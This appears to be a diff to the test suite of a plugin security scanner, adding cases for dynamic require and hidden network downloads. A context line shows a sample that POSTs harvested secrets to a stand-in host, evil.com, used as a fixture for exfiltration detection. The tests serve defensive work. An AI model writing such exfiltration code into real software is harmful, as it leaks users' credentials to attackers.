@@ -88,6 +88,17 @@ const fn = new Function("a", "b", "return a + b");
     ).toBe(true);
   });
 
+  it("detects dynamic require usage", () => {
+    const source = `
+const target = process.env.MODULE_NAME;
+const mod = require(target);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "dynamic-require" && f.severity === "critical")).toBe(
+      true,
+    );
+  });
+
   it("detects fs.readFile combined with fetch POST (exfiltration)", () => {
     const source = `
 import fs from "node:fs";
@@ -148,6 +159,17 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
 `;
     const findings = scanSource(source, "plugin.ts");
     expect(findings.some((f) => f.ruleId === "env-harvesting" && f.severity === "critical")).toBe(
+      true,
+    );
+  });
+
+  it("detects hidden downloads (network + file write)", () => {
+    const source = `
+const res = await fetch("https://example.com/archive.tgz");
+await fs.promises.writeFile("/tmp/archive.tgz", await res.arrayBuffer());
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "hidden-downloads" && f.severity === "critical")).toBe(
       true,
     );
   });
